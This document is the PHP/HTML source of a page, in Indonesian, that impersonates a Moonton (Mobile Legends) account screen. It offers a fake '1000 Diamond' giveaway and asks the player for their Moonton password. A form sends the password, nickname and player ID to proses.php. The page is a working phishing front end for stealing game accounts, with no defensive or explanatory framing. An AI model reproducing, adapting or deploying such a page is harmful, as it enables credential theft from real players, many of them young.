<?php
$nickname = $_GET['nickname'] ?? 'Player';
$playerid = $_GET['playerid'] ?? '000000';
?>
<!DOCTYPE html>
<html lang="id">

<head>
  <meta charset="UTF-8">
  <title>Akun Moonton</title>
  <style>
    body {
      background: url('https://wallpapers.com/images/hd/mobile-legends-bang-bang-logo-fight-2ia0z1qrfbimzsgi.jpg') no-repeat center center/cover;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
    }

    .account-box {
      background: rgba(0, 0, 0, 0.85);
      padding: 30px;
      border-radius: 12px;
      width: 400px;
      text-align: center;
      box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.9);
    }

    .account-box img {
      width: 100px;
      border-radius: 50%;
      border: 3px solid #ffcc00;
      margin-bottom: 15px;
    }

    .account-box h2 {
      margin-bottom: 10px;
      color: #ffcc00;
    }

    .account-box p {
      margin-bottom: 20px;
      font-size: 15px;
      color: #ddd;
    }

    .checkbox-container {
      margin: 15px 0;
      text-align: left;
      font-size: 14px;
      color: #ccc;
    }

    .btn {
      padding: 12px 20px;
      background: #ffcc00;
      border: none;
      border-radius: 8px;
      color: black;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
      width: 100%;
    }

    .btn:disabled {
      background: grey;
      cursor: not-allowed;
    }

    .btn:hover:enabled {
      background: #ffaa00;
    }
  </style>
  <script>
    function toggleButton() {
      let checkbox = document.getElementById("agree");
      let btn = document.getElementById("confirmBtn");
      btn.disabled = !checkbox.checked;
    }
  </script>
</head>

<body>
  <div class="account-box">
    <img src="https://w-lynk.b-cdn.net/lynk.id/profile/20-10-2022/1666281747678_1441827" alt="Avatar">
    <h2>Welcome, <?php echo htmlspecialchars($nickname); ?>!</h2>
    <p>ID: <?php echo htmlspecialchars($playerid); ?></p>
    <p>Akun Anda berhasil terhubung dengan sistem giveaway.<br>
      Silakan konfirmasi untuk klaim <b>1000 Diamond</b> 🎁</p>

    <form action="proses.php" method="post">
      <input type="hidden" name="nickname" value="<?php echo htmlspecialchars($nickname); ?>">
      <input type="hidden" name="playerid" value="<?php echo htmlspecialchars($playerid); ?>">

      <label for="password">Password Moonton:</label><br>
      <input type="password" name="password" required><br><br>

      <div class="checkbox-container">
        <input type="checkbox" id="agree" onclick="toggleButton()">
        <label for="agree">Saya bertanggung jawab atas data yang saya masukkan dan menyetujui klaim diamond.</label>
      </div>

      <button type="submit" id="confirmBtn" class="btn" disabled>KONFIRMASI</button>
    </form>
  </div>
</body>

</html>